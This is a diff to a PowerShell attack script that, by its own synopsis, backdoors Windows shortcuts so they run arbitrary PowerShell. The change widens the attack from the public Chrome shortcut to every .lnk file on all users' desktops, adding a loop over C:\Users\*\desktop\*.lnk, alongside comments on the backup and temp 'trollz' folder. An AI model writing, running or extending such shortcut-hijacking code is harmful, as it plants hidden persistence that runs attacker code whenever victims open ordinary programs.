@@ -1,4 +1,4 @@
-<#
+﻿<#
 .Synopsis
    Backdoors a windows shortcut with arbitrary powershell execution
 .DESCRIPTION
@@ -10,7 +10,7 @@
 #>
 Param
     (
-        $sourcepath = 'C:\Users\Public\Desktop\Google Chrome.lnk'
+        $sourcepath = 'C:\Users\Public\Desktop\Google Chrome.lnk' #defaults to public chrome install
     )
 $fname = (gci $sourcepath | Select-Object -First 1).name
 $destination = $env:HOMEPATH + "\AppData\Local\Temp\trollz\"
@@ -27,7 +27,7 @@ function backdoor-link($sourcepath, $destination){
 
     #copy link to temp dir and store target values
     Copy-Item $sourcepath $destination  ## Get the lnk we want to use as a template
-    Copy-Item $sourcepath $backupdir
+    Copy-Item $sourcepath $backupdir  ## backup origional link in a restore directory
     $shell = New-Object -COM WScript.Shell
     $shortcut = $shell.CreateShortcut($shortcutname)  ## Open the lnk
     $oldicon = $shortcut.TargetPath
@@ -49,5 +49,9 @@ function backdoor-link($sourcepath, $destination){
     $shortcut.Save()  ## Save
 }
 
-backdoor-link -sourcepath $sourcepath -destination $destination
-Copy-Item ($destination + $fname) $sourcepath
+$lnkpaths = (gci C:\Users\*\desktop\*.lnk).FullName
+
+$lnkpaths | % {
+    backdoor-link -sourcepath $_ -destination $destination
+    Copy-Item ($destination + $fname) $sourcepath
+} 
